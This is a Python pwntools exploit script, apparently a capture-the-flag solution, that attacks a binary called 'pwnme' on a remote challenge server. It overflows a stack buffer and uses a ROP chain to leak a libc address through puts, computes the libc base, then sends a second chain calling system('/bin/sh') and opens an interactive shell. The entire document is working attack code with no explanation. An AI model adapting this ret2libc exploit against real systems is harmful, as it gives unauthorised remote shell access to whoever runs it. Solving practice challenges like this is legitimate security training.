from pwn import *

HOST = "localhost"
PORT = 7005

HOST = '0.cloud.chals.io'
PORT = 24081

context.log_level = "DEBUG"

elf = ELF("pwnme")
context.binary = elf
libc = ELF("libc.so.6")

p = remote(HOST, PORT)
pop_rdi = 0x40127b

# craft payload 1
payload = flat({
    24: [
        pop_rdi,
        elf.got["__libc_start_main"],
        elf.plt["puts"],
        elf.sym["pwnme"]]
    })

p.sendline(payload)
p.recvuntil(b"pwn me\n")

# recv leaked addr
leak = int.from_bytes(p.recvline()[:-1], byteorder="little")
libc.address = leak - libc.sym["__libc_start_main"]
print(hex(libc.address))
binsh = next(libc.search(b"/bin/sh\0"))

# craft payload 2
payload2 = flat({
    24: [
        pop_rdi,
        binsh,
        libc.sym["system"]]
    })

# achieve pwn
p.sendline(payload2)
p.interactive()
